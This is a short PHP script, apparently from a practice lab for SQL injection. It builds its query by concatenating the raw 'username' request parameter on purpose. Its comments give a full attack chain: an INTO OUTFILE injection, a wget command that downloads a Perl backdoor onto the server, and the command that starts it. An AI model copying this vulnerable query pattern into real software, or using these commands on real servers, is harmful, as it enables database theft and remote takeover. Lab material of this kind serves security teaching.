<?php

    require '../functions.php';
    require '../config.php';

    // Create a PHP script that will run commands
    // Exploit query: http://secure.api/sql-injection/outfile.php?username=d;select%20*%20from%20user%20into%20outfile%20"/tmp/out2";
    //
    // Run new command script to install a backdoor
    // http://secure.api/sql-injection/dump/out3.php?cmd=wget%20http://secure.api/scripts/perl-backdoor.pl%20-O%20/tmp/perl-backdoor.pl
    //
    // Start new backdoor script
    // http://secure.api/sql-injection/dump/out3.php?cmd=perl%20/tmp/perl-backdoor.pl 127.0.0.1 8000
    // 

    file_put_contents('/var/www/web/sql-injection/dump/fpc.txt', "file put contents 2\n");

    $username = isset($_GET['username']) ? $_GET['username'] : null;

    $sql = "SELECT * FROM user WHERE username like '%". $username. "%'";

    try {
        $stmt = $db->prepare($sql);
        $stmt->execute();
    } catch(PDOException $ex) {
        echo "Some error occured: $sql\n";
        dd($ex->getMessage());
    }

    $results = $stmt->fetchAll();

    dd($results);




